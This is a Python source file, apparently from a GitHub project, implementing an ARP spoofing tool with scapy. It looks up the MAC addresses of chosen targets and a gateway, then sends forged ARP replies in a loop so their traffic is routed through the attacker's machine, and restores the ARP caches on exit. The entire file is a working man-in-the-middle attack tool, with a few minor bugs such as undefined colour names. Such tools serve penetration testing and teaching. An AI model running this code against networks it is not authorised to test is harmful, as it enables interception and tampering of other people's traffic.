# Source: https://github.com/ickerwx/arpspoof
import sys
import threading
from Queue import Queue
import time
from scapy.all import *

class ARPspoof:
    # index values into tuples
    IP = CMD = 0
    MAC = TARGET = 1
    
    # Colours for print
    __GREEN = '\033[92m'
    __RED = '\033[91m'
    __ENDC = '\033[0m'
    __BOLD = '\033[1m'

    # constructor
    def __init__(self, interface, targets, gateway):
        self.__interface = interface
        self.__targets = targets
        self.__gateway = gateway

    def get_MAC(self, interface, target_IP):
        # get the MAC address of target_IP and return it
        source_IP = get_if_addr(interface)
        source_MAC = get_if_hwaddr(interface)
        p = ARP(hwsrc=source_MAC, psrc=source_IP)  # ARP request by default
        p.hwdst = 'ff:ff:ff:ff:ff:ff'
        p.pdst = target_IP
        reply, unans = sr(p, timeout=5, verbose=0)
        if len(unans) > 0:
            # received no reply
            raise Exception('Error finding MAC for %s, try using -i' % target_IP)
        return reply[0][1].hwsrc


    def start_poison_thread(self, targets, gateway, control_queue, attacker_MAC):
        finish = False
        # the control queue is used to send commands to the poison thread
        # as soon as the thread finds the queue not empty, it will stop poisoning
        # and evaluate the item in the queue. It will process the command and then
        # either continue poisoning or finish its execution
        while not finish:
            # as long as no elements are in the queue, we will send ARP messages
            while control_queue.empty():
                for t in targets:
                    self.send_ARP(t[self.IP], t[self.MAC], gateway[self.IP], attacker_MAC)
                    self.send_ARP(gateway[self.IP], gateway[self.MAC], t[self.IP], attacker_MAC)
                time.sleep(1)

            # queue not empty, pull the element out of the queue to empty it again
            try:
                # item is a 2-element tuple (command, (IP, MAC))
                # item[CMD] = command, item[TARGET] = (IP, MAC)
                item = control_queue.get(block=False)
            except Empty:
                # The Empty exception is thrown when there is no element in the
                # queue. Something clearly is not working as it should...
                print(RED + 'Something broke, your queue idea sucks.' + ENDC)

            cmd = item[self.CMD].lower()
            if cmd in ['quit', 'exit', 'stop', 'leave']:
                # command to terminate the thread received
                finish = True
        # we are done, reset every host
        self.restore_ARP_caches(targets, gateway)


    def restore_ARP_caches(self, targets, gateway, verbose=True):
        # send correct ARP responses to the targets and the gateway
        print(self.__BOLD + 'Stopping the attack, restoring ARP cache' + self.__ENDC)
        for i in xrange(3):
            if verbose:
                print(self.__BOLD + "ARP %s is at %s" % (gateway[self.IP], gateway[self.MAC]) + self.__ENDC)
            for t in targets:
                if verbose:
                    print(self.__BOLD + "ARP %s is at %s" % (t[self.IP], t[self.MAC]) + self.__ENDC)
                self.send_ARP(t[self.IP], t[self.MAC], gateway[self.IP], gateway[self.MAC])
                self.send_ARP(gateway[self.IP], gateway[self.MAC], t[self.IP], t[self.MAC])
            time.sleep(1)
        print(self.__GREEN + 'Restored ARP caches' + self.__ENDC)


    def send_ARP(self, destination_IP, destination_MAC, source_IP, source_MAC):
        # op=2 is ARP response
        # psrc/hwsrc is the data we want the destination to have
        arp_packet = ARP(op=2, pdst=destination_IP, hwdst=destination_MAC, psrc=source_IP, hwsrc=source_MAC)
        send(arp_packet, verbose=0)


    def runARP(self):
        control_queue = Queue()
        # use supplied interface or let scapy choose one
        interface = self.__interface or get_working_if()
        attacker_MAC = get_if_hwaddr(interface)

        print(self.__BOLD + 'Using interface %s (%s)' % (interface, attacker_MAC) + self.__ENDC)
        try:
            # self.__targets should be a comma-separated string of IP-Adresses
            # 10.1.1.2,10.1.1.32,10.1.1.45
            # targets is a list of (IP, MAC) tuples
            targets = [(t.strip(), self.get_MAC(interface, t.strip())) for t in self.__targets.split(',')]
        except Exception, e:
            # Exception most likely because get_MAC failed, check if targets or gateway are
            # actually valid IP addresses
            print(self.__RED + e.message + self.__ENDC)
            sys.exit(1)

        # same as above, gateway is a (IP, MAC) tuple
        try:
            # self.__gateway is a single IP address
            gateway = (self.__gateway, self.get_MAC(interface, self.__gateway))
        except Exception, e:
            print(self.__RED + e.message + self.__ENDC)
            sys.exit(2)

        # create and start the poison thread
        poison_thread = threading.Thread(target=self.start_poison_thread, args=(targets, gateway, control_queue, attacker_MAC))
        poison_thread.start()

        try:
            while poison_thread.is_alive():
                time.sleep(1)  # delay is a quick hack to kind of sync output
                               # w/o this, the thread output messes up the prompt
                               # TODO: think of something a little less ugly
                command = raw_input('arpspoof# ').split()
                if command:
                    cmd = command[self.CMD].lower()
                    if cmd in ['help', '?']:
                        print(self.__BOLD + 'exit: stop poisoning and exit' + self.__ENDC)

                    elif cmd in ['quit', 'exit', 'stop', 'leave']:
                        control_queue.put(('quit',))
                        poison_thread.join()

        except KeyboardInterrupt:
            # Ctrl+C detected, so let's finish the poison thread and exit
            control_queue.put(('quit',))
            poison_thread.join()
